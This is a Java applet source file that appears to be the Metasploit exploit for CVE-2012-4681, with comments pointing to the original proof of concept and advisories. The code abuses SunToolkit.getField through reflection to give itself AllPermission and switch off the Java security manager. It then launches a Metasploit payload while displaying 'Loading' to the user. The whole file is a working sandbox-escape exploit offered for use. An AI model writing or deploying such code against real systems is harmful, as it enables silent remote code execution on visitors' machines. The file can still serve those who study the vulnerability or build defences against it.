//
// CVE-2012-4681 Exploit - See java_jre17_exec.rb
// PoC by Joshua J. Drake: https://twitter.com/jduck1337/status/239875285913317376
// Originally reported here: http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html
// Oracle's Security Alert: http://www.oracle.com/technetwork/topics/security/alert-cve-2012-4681-1835715.html
//

import java.applet.Applet;
import java.awt.Graphics;
import java.beans.Expression;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;
import metasploit.Payload;

public class Exploit extends Applet
{

    public Exploit()
    {
    }

    public void disableSecurity()
        throws Throwable
    {
        Statement localStatement = new Statement(System.class, "setSecurityManager", new Object[1]);
        Permissions localPermissions = new Permissions();
        localPermissions.add(new AllPermission());
        ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
        AccessControlContext localAccessControlContext = new AccessControlContext(new ProtectionDomain[] {
            localProtectionDomain
        });
        SetField(Statement.class, "acc", localStatement, localAccessControlContext);
        localStatement.execute();
    }

    private Class GetClass(String paramString)
        throws Throwable
    {
        Object arrayOfObject[] = new Object[1];
        arrayOfObject[0] = paramString;
        Expression localExpression = new Expression(Class.class, "forName", arrayOfObject);
        localExpression.execute();
        return (Class)localExpression.getValue();
    }

    private void SetField(Class paramClass, String paramString, Object paramObject1, Object paramObject2)
        throws Throwable
    {
        Object arrayOfObject[] = new Object[2];
        arrayOfObject[0] = paramClass;
        arrayOfObject[1] = paramString;
        Expression localExpression = new Expression(GetClass("sun.awt.SunToolkit"), "getField", arrayOfObject);
        localExpression.execute();
        ((Field)localExpression.getValue()).set(paramObject1, paramObject2);
    }

    public void init()
    {
        try
        {
            disableSecurity();
			Payload.main(null);               
        }
        catch(Throwable localThrowable)
        {
            localThrowable.printStackTrace();
        }
    }

    public void paint(Graphics paramGraphics)
    {
        paramGraphics.drawString("Loading", 50, 25);
    }
}
